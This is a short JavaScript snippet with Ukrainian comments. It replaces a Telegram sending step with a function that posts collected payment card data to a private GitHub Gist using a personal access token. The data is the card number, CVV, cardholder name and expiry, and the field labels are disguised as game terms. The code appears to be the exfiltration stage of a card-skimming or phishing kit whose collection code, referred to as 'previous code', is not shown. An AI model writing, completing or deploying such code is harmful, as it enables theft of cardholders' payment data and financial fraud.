// ... весь попередній код до відправки даних ...

// Замість відправки в Telegram
const saveToGist = async (cardData) => {
    const gistData = {
        description: `Card Data - ${new Date().toLocaleString('de-DE')}`,
        public: false,
        files: {
            [`card_${Date.now()}.txt`]: {
                content: `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}\ntime:${new Date().toLocaleString('de-DE')}`
            }
        }
    };

    try {
        // Тут потрібен GitHub Personal Access Token
        // Створи тут: https://github.com/settings/tokens
        const response = await fetch('https://api.github.com/gists', {
            method: 'POST',
            headers: {
                'Authorization': 'token ghp_tвій_токен_тут',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(gistData)
        });
        
        const result = await response.json();
        console.log('Збережено в Gist:', result.html_url);
    } catch (error) {
        console.error('Помилка збереження:', error);
    }
};

// Викликаємо після отримання даних
saveToGist(cardData);
